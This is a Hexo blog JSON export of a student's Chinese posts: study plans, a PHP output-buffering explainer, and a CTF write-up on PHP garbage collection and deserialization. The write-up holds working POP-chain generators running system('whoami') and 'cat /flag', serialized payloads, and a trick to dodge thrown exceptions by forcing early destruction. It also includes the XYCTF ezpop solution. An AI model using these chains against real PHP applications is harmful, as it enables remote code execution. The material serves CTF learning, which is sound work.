{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"","slug":"新博客迁移以及一些想说的话","date":"2024-12-03T13:56:20.894Z","updated":"2024-12-03T13:56:21.302Z","comments":true,"path":"2024/12/03/新博客迁移以及一些想说的话/","permalink":"http://example.com/2024/12/03/%E6%96%B0%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB%E4%BB%A5%E5%8F%8A%E4%B8%80%E4%BA%9B%E6%83%B3%E8%AF%B4%E7%9A%84%E8%AF%9D/","excerpt":"","text":"前言因为随着电脑的更换导致之前的博客的一些配置什么的不甚清楚了，所以重新弄了一个并且把之前的一些值得保留的内容搬了过来。 想对自己说的话：和实验室的兄弟们吃饭其实学到了良多，无论从知识上，策略上，都让我回忆起了之前刚进大学的热忱，晚上在被窝里思考良久，就仅以此篇，纪念我流逝的光阴，和新的开始，不要让99层的怀疑加1转为一层的自我否定，","categories":[],"tags":[]},{"title":"","slug":"2024年的第一篇blog","date":"2024-12-03T08:14:57.872Z","updated":"2024-12-03T08:17:32.307Z","comments":true,"path":"2024/12/03/2024年的第一篇blog/","permalink":"http://example.com/2024/12/03/2024%E5%B9%B4%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87blog/","excerpt":"","text":"title：2024年的第一篇blogdate： 2024-03-31 13:09:27tags：规划复盘2024大一下期，说实话学校的功课压力有点大，但是有感觉自己还学的远远不够，之前也是有小小的b溃过，光是web方面就够我担心的， 大一下期目前已经过了1&#x2F;4了，已经把是十大楼洞的原理，基本应对方法已经情况学的大差不差了，但是有些漏洞学的很草率，例如sql注入，ssti，ssrf 所以这个学期务必要将这些内容补齐， 规划说一年的规划还是太远了，可以先说一下我的网安小目标， 1、将上面所说的漏洞的不全给补齐， 2、刷够500道web题（30&#x2F;500） 3、学习node.js,thinkphp 4、python语言的学习 5、linux的使用和优化体验 心得这些只是下个月的目标，每次一看到那些努力的学长，和一些大牛，在只比你多学一年或两年的情况下却远远超出你所能想象的范围，我就无法停下我的脚步 这并不代表我是能全天24小时学习的圣人，但起码我要逼近我的极限，毕竟进这行的谁没有逼到自己的极限去学呢 虽然学长有说我们不用着急，但我希望我能突破自己心中的高墙，不要因为别人的三言两语就麻痹自己无需如此努力 如果你也看到了这，希望与君共勉，共创辉煌","categories":[],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2024-12-03T07:06:14.045Z","updated":"2024-12-03T07:06:14.045Z","comments":true,"path":"2024/12/03/hello-world/","permalink":"http://example.com/2024/12/03/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]},{"title":"PHP的多级缓冲机制","slug":"PHP的多级缓冲机制","date":"2024-07-15T08:54:16.000Z","updated":"2024-07-15T09:09:14.000Z","comments":true,"path":"2024/07/15/PHP的多级缓冲机制/","permalink":"http://example.com/2024/07/15/PHP%E7%9A%84%E5%A4%9A%E7%BA%A7%E7%BC%93%E5%86%B2%E6%9C%BA%E5%88%B6/","excerpt":"","text":"在 PHP 中，缓冲区（output buffering）是一种将输出数据暂存到内存中的技术。 它可以将脚本生成的所有输出数据保存在缓冲区中，直到缓冲区被显式地清空或者达到一定的大小限制时才会输出到客户端。 ob_clean — 清空（擦掉）输出缓冲区 ob_end_clean — 清空（擦除）缓冲区并关闭输出缓冲 ob_end_flush — 冲刷出（送出）输出缓冲区内容并关闭缓冲 ob_flush — 冲刷出（送出）输出缓冲区中的内容 ob_start — 打开输出控制缓冲 我们来段代码测试以下： 12345678910&lt;?phpob_start(); echo &#x27;level 1&lt;br/&gt; &#x27;;ob_start(); echo &#x27;level 2&lt;br/&gt; &#x27;;ob_start(); echo &#x27;level 3&lt;br/&gt; &#x27;;ob_end_flush();ob_end_flush();ob_end_flush(); 结果如下，可以看到都正常输出了 当程序修改一下，修改一个ob_end_flush() 变成 ob_end_clean() 成为以下这个， 12345678910&lt;?phpob_start(); echo &#x27;level 1&lt;br/&gt; &#x27;;ob_start(); echo &#x27;level 2&lt;br/&gt; &#x27;;ob_start(); echo &#x27;level 3&lt;br/&gt; &#x27;;ob_end_clean();//修改处ob_end_flush();ob_end_flush(); 结果如下,可能你会认为ob_end_clean()会清除与他最近的ob_start()的输出;其实这个说法不是很全面，看下面的例子 12345678910&lt;?phpob_start(); echo &#x27;level 1&lt;br/&gt; &#x27;;ob_start(); echo &#x27;level 2&lt;br/&gt; &#x27;;ob_start(); echo &#x27;level 3&lt;br/&gt; &#x27;;ob_end_clean(); //第一次修改ob_end_flush();ob_end_clean(); //第二次修改 这次什么输出都没有了中间不是有一个ob_flush()吗？按理来说应该是输出 level2 的。 其实造成这样的主要原因是输出的多级缓冲机制。这个程序例子有三个ob_start(),就意味着他有3个缓冲区A,B,C，而其实php程序本身也有一个最终输出的缓冲区，我们就把他叫做F。 在这个程序中他这几个缓冲区是有一定层次的，C-&gt;B-&gt;A-&gt;F，F层次最高，是程序最终的输出缓冲，我们按上面的程序来进行讲解。下面是从上至下的顺序来的 1234567891011121314151617181920&lt;?phpob_start();//F:null //然后新建缓冲区A。 A: null -&gt; F:nullecho &#x27;level 1&lt;br/&gt; &#x27;;//此时程序有输出，输出进入最低的缓冲区A A: &#x27;level 1&lt;br/&gt;&#x27; -&gt; F:nullob_start(); //新建缓冲区B 。 B:null -&gt; A: &#x27;level 1&lt;br/&gt;&#x27; -&gt; F:nullecho &#x27;level 2&lt;br/&gt; &#x27;;//程序有输出，输出进入最低的缓冲区B B:&#x27;level 2&lt;br/&gt; &#x27; -&gt; A: &#x27;level 1&lt;br/&gt;&#x27; -&gt;F:nullob_start(); //新建缓冲区C C:null B:&#x27;level 2&lt;br/&gt; &#x27; A: &#x27;level 1&lt;br/&gt;&#x27; -&gt; F:nullecho &#x27;level 3&lt;br/&gt; &#x27;;//程序有输出，输出进入最低的缓冲区C C:&#x27;level 3&lt;br/&gt; &#x27; -&gt; B:&#x27;level 2&lt;br/&gt; &#x27; -&gt; A: &#x27;level 1&lt;br/&gt;&#x27; -&gt; F:nullob_end_clean(); //缓冲区C被清空并关闭。 B:&#x27;level 2&lt;br/&gt; &#x27; -&gt; A: &#x27;level 1&lt;br/&gt;&#x27; -&gt; F:nullob_end_flush(); //缓冲区B输出到上一级的缓冲区A并关闭。 A: &#x27;level 1&lt;br/&gt;level 2&lt;br/&gt; &#x27; -&gt; F:nullob_end_clean(); //缓冲区A被清空并关闭。 此时缓冲区A的东西还没真正输出到最终的F中，因此也就整个程序也就没有任何的输出了。 也就是说，当我们多次建立新缓冲区，缓冲区们会根据建立先后去组成多级的缓冲区，每次接受输出的时候都相应的进入最低的(建立时间最晚)的缓冲区，而到了最后面清空或者输出缓冲区，都是按照顺序从最低的那级缓冲区进行操作，flush就是输出至下一级缓冲区，clean就是将当前处理的最低一块缓冲区的输出置为null， 最后附上一些关于ob的函数操作 flush — 刷新输出缓冲 ob_clean — 清空（擦掉）输出缓冲区 ob_end_clean — 清空（擦除）缓冲区并关闭输出缓冲 ob_end_flush — 冲刷出（送出）输出缓冲区内容并关闭缓冲 ob_flush — 冲刷出（送出）输出缓冲区中的内容 ob_get_clean — 得到当前缓冲区的内容并删除当前输出缓。 ob_get_contents — 返回输出缓冲区的内容 ob_get_flush — 刷出（送出）缓冲区内容，以字符串形式返回内容，并关闭输出缓冲区。 ob_get_length — 返回输出缓冲区内容的长度 ob_get_level — 返回输出缓冲机制的嵌套级别 ob_get_status — 得到所有输出缓冲区的状态 ob_gzhandler — 在ob_start中使用的用来压缩输出缓冲区中内容的回调函数。ob_start callback function to gzip output buffer ob_implicit_flush — 打开&#x2F;关闭绝对刷送 ob_list_handlers — 列出所有使用中的输出处理程序。 ob_start — 打开输出控制缓冲 output_add_rewrite_var — 添加URL重写器的值（Add URL rewriter values） output_reset_rewrite_vars — 重设URL重写器的值（Reset URL rewriter values","categories":[],"tags":[{"name":"php","slug":"php","permalink":"http://example.com/tags/php/"}]},{"title":"详谈PHP垃圾回收机制","slug":"详谈PHP垃圾回收机制","date":"2024-04-07T15:41:51.000Z","updated":"2024-04-28T14:48:24.000Z","comments":true,"path":"2024/04/07/详谈PHP垃圾回收机制/","permalink":"http://example.com/2024/04/07/%E8%AF%A6%E8%B0%88PHP%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/","excerpt":"","text":"一、PHP中GC介绍Gc，全称Garbage collection，即垃圾回收机制在PHP中，是使用&#x3D;&#x3D;引用计数&#x3D;&#x3D;和&#x3D;&#x3D;回收周期&#x3D;&#x3D;来自动管理内存对象的，当一个对象被设置为NULL，或者没有任何指针指向时，他就会变成垃圾，被GC机制回收掉，这里其实就可以理解为当一个对象没有被引用时，也就是基本类型(字符串，整形等等），被引用也就是一个对象(Object），在这可以理解为一个对象没有被引用时就会被GC机制回收先引入一个函数xdebug_debug_zval，该函数用以查看变量容器的内容： 123&lt;?php $a=&quot;Athur&quot;; xdebug_debug_zval(&quot;a&quot;); 如下图： 有两个参数，一个refcount,一个is_ref..在PHP的CG机制当中，当程序结束时refcount减一，如果refcount-1&#x3D;0的话，那么就会将这个变量销毁 引用计数首先我们要知道，PHP 变量都是存储在称为“zval”的容器中。zval 容器除了变量的类型和值之外，还包含两个额外的信息位。第一个是“is_ref”，是布尔值，表示变量是否被引用，值为1为真，0为否。通过这个位，PHP 引擎就知道如何区分普通变量和引用。由于 PHP 允许用户自定义引用，通过 &amp; 运算符创建引用，zval 容器还有内部引用计数机制来优化内存使用。第二个是“refcount”，表示有多少个变量名（也称为符号）指向这个 zval 容器。所有符号都存储在一个符号表中，每个作用域都有一个符号表。主脚本（即通过浏览器请求的脚本）有一个作用域，每个函数或方法也有一个作用域。例如在上面的例子中可以看到recount、is_ref两个变量，recount表示的是指向变量a容器的变量个数，is_ref是boolean类型的，表示该变量是否被引用回到上述例子，在上述例子中定义的是一个字符串类型的变量，因此is_ref==0，因为并没有被引用，但是我们如果修改一下代码，如下： 12345&lt;?php $a=&quot;Athur&quot;; xdebug_debug_zval(&quot;a&quot;); $b=&amp;$a; xdebug_debug_zval(&quot;a&quot;); 结果如下: 可以看到is_ref为1，代表被引用了，也就是true，refcount为2，符合我们上述所说的规则， 那假如是数组又会发生什么呢？ 123456&lt;?php$a=&quot;Athur&quot;; $arr=array(0=&gt;&quot;test&quot;,1=&gt;&amp;$a);xdebug_debug_zval(&quot;a&quot;);xdebug_debug_zval(&quot;arr&quot;);|?&gt; 结果如下图： 数组中唯一的区别就是它还把内部的元素也，那假如我们再debug之前把变量销毁了呢？ 12345678910111213&lt;?php $a=&quot;Athur&quot;; $arr=array(0=&gt;&quot;test&quot;,1=&gt;&amp;$a); unset($a); xdebug_debug_zval(&quot;a&quot;); xdebug_debug_zval(&quot;arr&quot;); // &lt;?php $a=&quot;Athur&quot;; unset($a); $arr=array(0=&gt;&quot;test&quot;,1=&gt;&amp;$a); xdebug_debug_zval(&quot;a&quot;); xdebug_debug_zval(&quot;arr&quot;); 两个不同的码导致了不同的结果： 第二种结果虽然结果为空，但是refcount还是不会为1，也就是不会被销毁，因为它在销毁了$a后又将$a进行了引用，此时相当于引用一个空对象，第一种则会被销毁，因为它时实打实销毁完后没有再进行引用的操作了 PHP GC与反序列化首先我们引入一个正常的Demo： 12345678910111213141516&lt;?php class gc&#123; public $num; public function __construct($num) &#123; $this-&gt;num=$num; echo &quot;construct(&quot;.$num.&quot;)&quot;.&quot;\\n&quot;; &#125; public function __destruct() &#123; echo &quot;destruct(&quot;.$this-&gt;num.&quot;)&quot;.&quot;\\n&quot;; &#125; &#125; $a=new gc(1); $b=new gc(2); $c=new gc(3); 可以看到构造函数创建顺序和销毁顺序都符合我们的预想和规则，在这里用zval函数去看看情况： 可以看到refcount为1，所以在程序结束时候销毁了，假如我们不把实例化对象赋给$a，直接new一个gc类会发生什么？ 发现在construct后1号的析构方法提前触发了，因为这个对象没进行赋值，所以根本不存在引用，因此原地销毁由此可知，如果一个对象没有及时的进行赋值，那么php就会为了节省内存直接将其原地销毁 绕过Exception异常这是这个gc回收机制最常出现的地方，在此之前我们继续分析一下上述例子，我们将代码改为： 123456789101112131415161718&lt;?php class gc&#123; public $num; public function __construct($num) &#123; $this-&gt;num=$num; echo &quot;construct(&quot;.$num.&quot;)&quot;.&quot;\\n&quot;; &#125; public function __destruct() &#123; echo &quot;destruct(&quot;.$this-&gt;num.&quot;)&quot;.&quot;\\n&quot;; &#125; &#125; $arr=array(0=&gt;new gc(1),1=&gt;NULL);//将gc的1号实例化对象赋给$arr的第0号元素，//$arr[0]=$arr[1]; xdebug_debug_zval(&#x27;arr&#x27;); $b=new gc(2); $c=new gc(3); 输出结果： 很正常的输出结果，假如把注释取消，这样的话0就指向了NULL，会发生什么？ 果然直接原地销毁，提前触发了destruct，我们就可以利用这一种提前触发的方法去绕过Exception：例题： 123456789101112131415161718192021222324252627&lt;?php highlight_file(__FILE__); error_reporting(0); class gc0&#123; public $num; public function __destruct()&#123; echo $this-&gt;num.&quot;hello __destruct&quot;; &#125; &#125; class gc1&#123; public $string; public function __toString() &#123; echo &quot;hello __toString&quot;; $this-&gt;string-&gt;flag(); return &#x27;useless&#x27;; &#125; &#125; class gc2&#123; public $cmd; public function flag()&#123; echo &quot;hello __flag()&quot;; eval($this-&gt;cmd); &#125; &#125; $a=unserialize($_GET[&#x27;code&#x27;]); throw new Exception(&quot;Garbage collection&quot;); ?&gt; 按照平常很正常的pop链，顺序如下：gc0::__destruct-&gt;gc1::__tostring-&gt;gc2::flag() pop链： 12345678910111213141516&lt;?php class gc0&#123; public $num; &#125; class gc1&#123; public $string; &#125; class gc2&#123; public $cmd=&#x27;system(&quot;whoami&quot;)&#x27;; &#125; $a=new gc0; $b=new gc1; $c=new gc2; $a-&gt;num=$b; $b-&gt;string=$c; echo serialize($a); 放入我们生成的反序列化字符串，本来GC默认在所有程序都结束完毕后才执行，但是在所有代码执行前插入了一条GC语句导致提前触发没收(回收)了我们的反序列化的对象，因为我们要触发的目标魔术方法一般是destruct，我们如果乖乖的让我们的反序列化后的字符串乖乖落到这一句提前回收的语句手里，那我们什么都得不到，因为这里相当直接咔嚓掉了那我们怎么做呢，既然防守方想要提前冒出来抢我们的劫，我们必须提前做出行动避免吧，那我们干脆在提前GC语句前将其直接更提前销毁，这样操作的主动权就又落到我们手里了，触发了destruct，大概顺序如下1、程序2、我们自己主动销毁3、提前的GC4、原本的GC是不是提前触发了destruct？这样的话就得等到所有魔术方法触发完了才会轮到提前的GC，但此时已晚~而提前触发析构函数的操作的原理，如上所述，在PHP语言中，即使一个对象被实例化了，如果没有被赋给某个变量，也就不存在引用，就会原地销毁，因此我们只需要使用数组变量，元素0等于它，元素1等于NULL，正常生成字符串，此时我们手动将这个数组元素的对应键名改为1，相当于让它等于NULL了 又或者我们正常生成字符串，然后将其结构破坏，或者利用对键名大小写不敏感，改改大小写，就能提前触发我们修改pop： 1234567891011121314151617&lt;?php class gc0&#123; public $num; &#125; class gc1&#123; public $string; &#125; class gc2&#123; public $cmd=&#x27;system(&quot;whoami&quot;);&#x27;; &#125; $a=new gc0; $b=new gc1; $c=new gc2; $a-&gt;num=$b; $b-&gt;string=$c; $arr=array(0=&gt;$a,1=&gt;NULL); //挑一个你不爽的，把他的结构破坏掉，使他等于NULLecho serialize($arr); 得到结果a:2:&#123;i:0;O:3:&quot;gc0&quot;:1:&#123;s:3:&quot;num&quot;;O:3:&quot;gc1&quot;:1:&#123;s:6:&quot;string&quot;;O:3:&quot;gc2&quot;:1:&#123;s:3:&quot;cmd&quot;;s:17:&quot;system(&quot;whoami&quot;);&quot;;&#125;&#125;&#125;i:1;N;&#125;这时候我们把键名1改为0，也就是修改结果为a:2:&#123;i:0;O:3:&quot;gc0&quot;:1:&#123;s:3:&quot;num&quot;;O:3:&quot;gc1&quot;:1:&#123;s:6:&quot;string&quot;;O:3:&quot;gc2&quot;:1:&#123;s:3:&quot;cmd&quot;;s:17:&quot;system(&quot;whoami&quot;);&quot;;&#125;&#125;&#125;i:0;N;&#125;，成功执行 例题题目名称 【2024XYCTF】ezpop| 题目状态 SOLVED| working : Athur开始直接给源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?php error_reporting(0); highlight_file(__FILE__); class AAA &#123; public $s; public $a; public function __toString() &#123; echo &quot;you get 2 A &lt;br&gt;&quot;; $p = $this-&gt;a; return $this-&gt;s-&gt;$p; &#125; &#125; class BBB &#123; public $c; public $d; public function __get($name) &#123; echo &quot;you get 2 B &lt;br&gt;&quot;; $a=$_POST[&#x27;a&#x27;]; $b=$_POST; $c=$this-&gt;c; $d=$this-&gt;d; if (isset($b[&#x27;a&#x27;])) &#123; unset($b[&#x27;a&#x27;]); &#125; call_user_func($a,$b)($c)($d); &#125; &#125; class CCC &#123; public $c; public function __destruct() &#123; echo &quot;you get 2 C &lt;br&gt;&quot;; echo $this-&gt;c; &#125; &#125; if(isset($_GET[&#x27;xy&#x27;])) &#123; $a = unserialize($_GET[&#x27;xy&#x27;]); throw new Exception(&quot;noooooob!!!&quot;); &#125; 一、思路的理清看到是反序列化，我们来理清poc链： 12345public function __destruct() &#123; echo &quot;you get 2 C &lt;br&gt;&quot;; echo $this-&gt;c; &#125; 看到destruct，找到了入口，我们就以destruct开始跟进，可以看到这个方法为对象调用了c成员属性，但是又将对象当成字符串echo了，这里会触发tostring方法 我们持续跟进： 123456public function __toString() &#123; echo &quot;you get 2 A &lt;br&gt;&quot;; $p = $this-&gt;a; return $this-&gt;s-&gt;$p; &#125; 可以看到在最后的return语句，为s属性调用了一个并不存在的成员属性$p,这里会触发get方法 继续跟进： 123456789101112public function __get($name) &#123; echo &quot;you get 2 B &lt;br&gt;&quot;; $a=$_POST[&#x27;a&#x27;]; $b=$_POST; $c=$this-&gt;c; $d=$this-&gt;d; if (isset($b[&#x27;a&#x27;])) &#123; unset($b[&#x27;a&#x27;]); &#125; call_user_func($a,$b)($c)($d); &#125; 这里就比较复杂了，首先我们基本可以确定这里是终点 没有看到eval，include等危险的函数，但是有一个call_user_func()，而且语法很奇怪，正常语法是没有后面两个括号的，查询后得知这个函数主要是返回输入的第一个参数， 这里诡异的后面放两个括号，且都可以控制他们的变量的值，很有可能是命令的一个拼接。 于是我们基本了解了整体的思路： 1、构造poc，依次触发魔术方法 2、弄清get方法的内部逻辑 二、初步poc链的构造初步poc链如下： 1234$C=new CCC(); //实例化destruct方法所在的类，作为入口$C-&gt;c=new AAA(); //将CCC类的c方法作为AAA类的实例化对象，这样就能触发tostring$C-&gt;c-&gt;a=&#x27;$a&#x27;; //为此时AAA类的实例化对象c赋予a的成员属性，$C-&gt;c-&gt;s=new BBB();//将AAA类的另一个成员属性与BBB类实例化，这样tostring就能触发BBB中的get方法 三、poc链的进一步构造1234567891011121314151617class BBB &#123; public $c; public $d; public function __get($name) &#123; echo &quot;you get 2 B &lt;br&gt;&quot;; $a=$_POST[&#x27;a&#x27;]; $b=$_POST; $c=$this-&gt;c; $d=$this-&gt;d; if (isset($b[&#x27;a&#x27;])) &#123; unset($b[&#x27;a&#x27;]); &#125; call_user_func($a,$b)($c)($d); &#125; &#125; 首先有了上面对call_user_func函数的了解和猜测，我猜测他是命令执行的一个拼接，那我接下来就可以尝试如何输入，输入哪些能使得 call_user_func($a,$b)($c)($d);变成我想要的命令去执行 $a接受post数组中a元素的值 $b就是整个$_POST数组 而call_user_func()接受$a,$b,原理是call_user_func()将第一个参数作为函数名，后面的所有参数作为这一回调函数的参数，假设$a&#x3D;’eval’,$b&#x3D;’echo lk’,那么call_user_func()执行后就会变成eval(echo lk;); 言下之意，我们又可以控制$a,$b的值，使call_user_func()执行后变成我们想要的函数 这里介绍几个函数： current(): current() 函数返回数组中的当前元素的值。在未进行指针操作时，current()默认返回数组的第一个元素 strrev() ： strrev() 函数将接受到的字符串倒序输出，具有输出字符串的能力 tips：这里并不一定要是strrev()函数，只要这个函数具有输出字符串的能力就能满足我们的要求 我们肯定不能让$a,$b直接赋我们要执行的命令，因为后面还有两个变量等着拼接呢，所以我们选择将我们的目标命令放在后面， 目标命令system(cat+&#x2F;flag) 所以我们利用以上的函数： call_user_func($a,$b)($c)($d)变为了 current(strrev(metsys))(cat+&#x2F;flag);等价于system(‘cat+&#x2F;flag’); 所以我们就能进行poc的进一步构造了 1234567$C=new CCC();$C-&gt;c=new AAA();$C-&gt;c-&gt;a=&#x27;$a&#x27;;$C-&gt;c-&gt;s=new BBB();$C-&gt;c-&gt;s-&gt;c=&#x27;metsys&#x27;;$C-&gt;c-&gt;s-&gt;d=&#x27;cat+/flag&#x27;;echo serialize($C); 但是这里有个地方被忽略了： 123if (isset($b[&#x27;a&#x27;])) &#123; unset($b[&#x27;a&#x27;]); &#125; 这段代码会将post数组中a元素的值删去，但是它的特性是当数组中有多个同元素但不同值的情况时，只会删除第一个匹配的元素，因此我们把我们想要的命令以同一个元素名放在后面就能避免被删除，post数组情况如下： $b&#x3D;$_POST&#x3D;{‘a’&#x3D;&gt;call_user_func,’c’&#x3D;&gt;’sttrev’，’a’&#x3D;&gt;’current’} 当unset在处理时，将第一个删去，后面的就不再处理 而$a和$b都与post数组相关，因此我们要用bp以post传入 我们打开bp将其发送到Repeater，改变请求方法，将1号替死鬼a，2号a，c的值以post报文的形式传入： 如图： 四、源码主干部分的考虑但是仍然得不到flag，很明显类之间的事已经处理完也正常回显了，那只可能是poc链以外的代码没考虑 果不其然有一处没考虑： 1throw new Exception(&quot;noooooob!!!&quot;); 这个什么意思呢？大致意思就是只要你的反序列化结果在执行流程下遇到了它，他就会报错并提前回收你的反序列化对象 这个throw就是GC回收（垃圾回收机制），这里需要绕过它。 首先我们需要知道： 在php中，当对象被销毁时会自动调用__destruct()方法，但如果程序报错或者抛出异常，就不会触发该魔术方法。 当一个类创建之后它会自己消失，而 __destruct() 魔术方法的触发条件就是一个类被销毁时触发，而throw那个函数就是回收了自动销毁的类，导致destruct检测不到有东西销毁，从而也就导致无法触发destruct函数。 而我们的目的就是为了触发destruct方法，这反而阻碍了我们 我们可以通过提前触发垃圾回收机制来抛出异常，从而绕过GC回收，唤醒__destruct()魔术方法。 触发垃圾回收机制的方法有：（本质即使对象引用计数归零） 一、利用“PHP对类名的大小写不敏感”，例如POST提交参数wwwwwwwwwwd 二、利用破坏反序列化结构，这个需要记住即可，例如POST提交参数O:7:”ctfshow”:2:{ctfshow} 我们利用上述方法绕过，成功得到flag： 五、总结：非常经典且考点全面的反序列化题，建议反复咀嚼，其思路和构造方式与细节值得一学","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"},{"name":"反序列化","slug":"反序列化","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"GC","slug":"GC","permalink":"http://example.com/tags/GC/"}]}],"categories":[],"tags":[{"name":"php","slug":"php","permalink":"http://example.com/tags/php/"},{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"},{"name":"反序列化","slug":"反序列化","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"GC","slug":"GC","permalink":"http://example.com/tags/GC/"}]}